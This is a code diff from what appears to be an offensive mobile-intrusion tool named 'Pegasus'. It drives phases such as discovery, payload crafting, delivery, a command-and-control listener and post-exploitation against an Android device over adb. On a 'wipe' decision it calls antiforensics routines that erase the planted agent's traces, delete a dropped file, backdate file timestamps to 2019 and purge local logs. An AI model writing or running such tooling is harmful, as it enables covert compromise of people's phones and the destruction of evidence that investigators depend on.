+        if decision == "maintain":
+            self.set(Phase.MAINTAIN)
+            self.session["kept"] = True
+            self.log("maintained")
+            self.set(Phase.DONE)
+            return
+        if decision != "wipe":
+            self.log("aborted")
+            self.set(Phase.DONE)
+            return
+        self.set(Phase.WIPE)
+        try:
+            from ..report import pdf_report
+            pdf_report.build(self.id, RUNS / f"{self.id}.pdf")
+        except Exception as exc:
+            self.log(f"report failed: {exc}")
+        if serial:
+            from ..antiforensics import wipe
+            wipe.clear_traces(serial, self.opts.get("package") or "com.pegasus.agent",
+                              ["/sdcard/Download/ld.tmp"])
+            wipe.scrub_times(serial, "/sdcard/Download",
+                             time.strftime("%Y-%m-%dT%H:%M:%S"), "2019-01-01")
+            adb("disconnect", serial)
+        if self.session.get("listener"):
+            from ..c2 import server
+            server.stop()
+        journal.archive(self.id, RUNS / f"{self.id}.json")
+        wipe_local(self.dir)
+        journal.purge(self.id)
+        registry.unbind(self.id)
+        self.log("wiped and disconnected")
+        self.set(Phase.DONE)
+
+
+def json_dumps(obj) -> str:
+    import json
+    return json.dumps(obj, indent=2)
+
+
+def wipe_local(run_dir: pathlib.Path) -> None:
+    for child in run_dir.iterdir():
+        if child.suffix in (".json", ".pdf"):
+            continue
+        if child.is_dir():
+            shutil.rmtree(child, ignore_errors=True)
+        else:
+            child.unlink(missing_ok=True)
+
+
+_ACTIVE: dict[str, Run] = {}
+_LOCK = threading.Lock()
+
+
+def start(opts: dict) -> Run:
+    run_id = time.strftime("%Y%m%d-%H%M%S") + "-" + secrets.token_hex(3)
+    run = Run(run_id, opts)
+    with _LOCK:
+        _ACTIVE[run_id] = run
+
+    def worker() -> None:
+        try:
+            for phase in (run.discover, run.triage, run.craft, run.deliver,
+                          run.listen, run.post):
+                phase()
+            run.finish()
+        except Exception as exc:
+            run.log(f"FATAL: {exc}")
+            run.set(Phase.FAILED)
+            registry.unbind(run.id)
+            notify("Pegasus â€” cycle failed", str(exc))
+
+    threading.Thread(target=worker, daemon=True).start()
+    return run
+
+
+def get(run_id: str) -> Run | None:
+    return _ACTIVE.get(run_id)
+
+
+def decide(run_id: str, decision: str) -> bool:
+    run = _ACTIVE.get(run_id)
+    if not run or run.phase is not Phase.DECIDING:
+        return False
+    run.decision = decision
+    run.decided.set()
+    return True
